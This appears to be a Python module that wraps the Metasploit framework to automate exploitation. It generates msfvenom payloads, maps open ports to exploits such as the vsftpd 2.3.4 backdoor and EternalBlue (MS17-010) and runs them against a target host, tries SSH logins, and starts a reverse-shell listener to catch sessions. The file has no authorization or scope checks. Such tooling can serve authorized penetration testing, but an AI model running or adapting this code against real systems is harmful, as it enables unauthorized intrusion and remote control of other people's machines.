
"""
Metasploit framework integration for automated exploitation
"""
import subprocess
import logging
import json
import time
from typing import Dict, List, Any, Optional

class MetasploitIntegration:
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        self.msf_console = None
        
    def start_metasploit_service(self) -> bool:
        """Start Metasploit service"""
        try:
            # Start PostgreSQL (required for Metasploit)
            subprocess.run(["sudo", "systemctl", "start", "postgresql"], check=True)
            
            # Initialize MSF database
            subprocess.run(["sudo", "msfdb", "init"], check=True)
            
            self.logger.info("Metasploit service started successfully")
            return True
        except Exception as e:
            self.logger.error(f"Failed to start Metasploit service: {e}")
            return False
    
    def search_exploits(self, service: str, version: str = "") -> List[Dict[str, Any]]:
        """Search for exploits for a specific service"""
        try:
            search_term = f"{service} {version}".strip()
            
            result = subprocess.run([
                "msfconsole", "-q", "-x", f"search {search_term}; exit"
            ], capture_output=True, text=True, timeout=60)
            
            exploits = []
            lines = result.stdout.split('\n')
            
            for line in lines:
                if 'exploit/' in line and line.strip():
                    parts = line.split()
                    if len(parts) >= 3:
                        exploits.append({
                            "name": parts[0],
                            "disclosure_date": parts[1] if len(parts) > 1 else "Unknown",
                            "rank": parts[2] if len(parts) > 2 else "Unknown",
                            "description": " ".join(parts[3:]) if len(parts) > 3 else ""
                        })
            
            return exploits
            
        except Exception as e:
            self.logger.error(f"Exploit search failed: {e}")
            return []
    
    def generate_payload(self, payload_type: str, lhost: str, lport: int, 
                        format_type: str = "elf") -> Optional[str]:
        """Generate payload using msfvenom"""
        try:
            output_file = f"/tmp/payload_{int(time.time())}.{format_type}"
            
            cmd = [
                "msfvenom",
                "-p", payload_type,
                f"LHOST={lhost}",
                f"LPORT={lport}",
                "-f", format_type,
                "-o", output_file
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            if result.returncode == 0:
                self.logger.info(f"Payload generated: {output_file}")
                return output_file
            else:
                self.logger.error(f"Payload generation failed: {result.stderr}")
                return None
                
        except Exception as e:
            self.logger.error(f"Payload generation error: {e}")
            return None
    
    def run_exploit(self, exploit_name: str, target_host: str, 
                   target_port: int, options: Dict[str, str] = None) -> Dict[str, Any]:
        """Run a specific exploit"""
        try:
            # Create resource script
            resource_script = f"/tmp/exploit_{int(time.time())}.rc"
            
            commands = [
                f"use {exploit_name}",
                f"set RHOSTS {target_host}",
                f"set RPORT {target_port}"
            ]
            
            # Add custom options
            if options:
                for key, value in options.items():
                    commands.append(f"set {key} {value}")
            
            commands.extend([
                "check",
                "exploit -z",
                "exit"
            ])
            
            with open(resource_script, 'w') as f:
                f.write('\n'.join(commands))
            
            # Run exploit
            result = subprocess.run([
                "msfconsole", "-q", "-r", resource_script
            ], capture_output=True, text=True, timeout=300)
            
            # Parse results
            success = False
            session_info = None
            
            if "session" in result.stdout.lower() and "opened" in result.stdout.lower():
                success = True
                # Extract session information
                for line in result.stdout.split('\n'):
                    if "session" in line.lower() and "opened" in line.lower():
                        session_info = line.strip()
                        break
            
            return {
                "exploit": exploit_name,
                "target": f"{target_host}:{target_port}",
                "success": success,
                "session_info": session_info,
                "output": result.stdout,
                "error": result.stderr
            }
            
        except Exception as e:
            self.logger.error(f"Exploit execution failed: {e}")
            return {
                "exploit": exploit_name,
                "target": f"{target_host}:{target_port}",
                "success": False,
                "error": str(e)
            }
    
    def automated_exploitation(self, target_info: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Automated exploitation based on target information"""
        results = []
        
        host = target_info.get("host")
        ports = target_info.get("ports", [])
        
        # Service to exploit mapping
        exploit_mappings = {
            "21": ["exploit/unix/ftp/vsftpd_234_backdoor"],
            "22": ["auxiliary/scanner/ssh/ssh_login"],
            "23": ["exploit/linux/telnet/telnet_encrypt_keyid"],
            "80": ["auxiliary/scanner/http/dir_scanner", "auxiliary/scanner/http/files_dir"],
            "443": ["auxiliary/scanner/http/dir_scanner"],
            "139": ["exploit/windows/smb/ms17_010_eternalblue"],
            "445": ["exploit/windows/smb/ms17_010_eternalblue"],
            "3389": ["auxiliary/scanner/rdp/rdp_scanner"]
        }
        
        for port_info in ports:
            port = port_info.get("port")
            service = port_info.get("service", "")
            
            if port in exploit_mappings:
                for exploit in exploit_mappings[port]:
                    self.logger.info(f"Attempting {exploit} on {host}:{port}")
                    
                    result = self.run_exploit(exploit, host, int(port))
                    results.append(result)
                    
                    # If successful, don't try more exploits for this port
                    if result.get("success"):
                        break
                    
                    time.sleep(2)  # Rate limiting
        
        return results
    
    def setup_listener(self, lhost: str, lport: int) -> bool:
        """Setup a listener for reverse connections"""
        try:
            listener_script = f"/tmp/listener_{int(time.time())}.rc"
            
            commands = [
                "use exploit/multi/handler",
                "set PAYLOAD generic/shell_reverse_tcp",
                f"set LHOST {lhost}",
                f"set LPORT {lport}",
                "exploit -j"
            ]
            
            with open(listener_script, 'w') as f:
                f.write('\n'.join(commands))
            
            # Start listener in background
            subprocess.Popen([
                "msfconsole", "-q", "-r", listener_script
            ])
            
            self.logger.info(f"Listener started on {lhost}:{lport}")
            return True
            
        except Exception as e:
            self.logger.error(f"Failed to setup listener: {e}")
            return False
    
    def get_session_info(self) -> List[Dict[str, Any]]:
        """Get information about active sessions"""
        try:
            result = subprocess.run([
                "msfconsole", "-q", "-x", "sessions -l; exit"
            ], capture_output=True, text=True, timeout=30)
            
            sessions = []
            lines = result.stdout.split('\n')
            
            for line in lines:
                if line.strip() and not line.startswith('Active sessions'):
                    parts = line.split()
                    if len(parts) >= 4:
                        sessions.append({
                            "id": parts[0],
                            "type": parts[1],
                            "info": " ".join(parts[2:])
                        })
            
            return sessions
            
        except Exception as e:
            self.logger.error(f"Failed to get session info: {e}")
            return []
